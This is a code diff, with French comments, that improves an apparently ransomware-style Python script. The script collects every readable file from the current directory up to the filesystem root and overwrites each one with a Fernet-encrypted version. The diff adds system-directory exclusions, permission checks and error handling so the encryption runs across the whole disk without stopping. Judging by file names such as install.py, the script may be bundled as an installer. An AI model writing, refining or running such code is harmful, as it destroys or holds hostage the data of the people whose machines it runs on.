@@ -8,25 +8,44 @@ from cryptography.fernet import Fernet
 if os.path.exists("thekey.key"):
     os.remove("thekey.key")
 
-def get_all_files(directory):
+def get_all_files(directory, excluded_dirs):
     all_files = []
     for root, _, files in os.walk(directory):
+        # Exclure les répertoires spécifiques
+        if any(excluded_dir in root for excluded_dir in excluded_dirs):
+            continue
+        # Vérifier les permissions du répertoire
+        if not os.access(root, os.R_OK):
+            print(f"Permission refusée pour accéder au répertoire {root}")
+            continue
         for file in files:
-            all_files.append(os.path.join(root, file))
+            filepath = os.path.join(root, file)
+            try:
+                # Tenter d'ouvrir le fichier pour vérifier les permissions
+                if os.access(filepath, os.R_OK):
+                    all_files.append(filepath)
+                else:
+                    print(f"Permission refusée pour accéder à {filepath}")
+            except Exception as e:
+                print(f"Erreur inattendue pour {filepath}: {e}")
     return all_files
+
+# Définir les répertoires à exclure
+excluded_dirs = ["/proc", "/sys", "/dev"]
 
 # Remonter les répertoires et collecter les fichiers
 files = []
 current_dir = os.getcwd()
 while True:
-    files.extend(get_all_files(current_dir))
+    files.extend(get_all_files(current_dir, excluded_dirs))
     parent_dir = os.path.abspath(os.path.join(current_dir, os.pardir))
     if parent_dir == current_dir:  # Si on est à la racine du système de fichiers
         break
     current_dir = parent_dir
 
 # Filtrer les fichiers à exclure
-files = [file for file in files if os.path.basename(file) not in ["install.py", "thekey.key", "demal.py", "InstallRB.py", "requirements.txt", "README.md"]]
+excluded_files = ["install.py", "thekey.key", "demal.py", "InstallRB.py", "requirements.txt", "README.md"]
+files = [file for file in files if os.path.basename(file) not in excluded_files]
 
 print(files)
 
@@ -57,6 +76,8 @@ for file in files:
         contents_encrypted = Fernet(key).encrypt(contents)
         with open(file, "wb") as thefile:
             thefile.write(contents_encrypted)
+    except PermissionError:
+        print(f"Permission refusée pour chiffrer {file}")
     except Exception as e:
         print(f"Erreur lors du chiffrement de {file}: {e}")
 
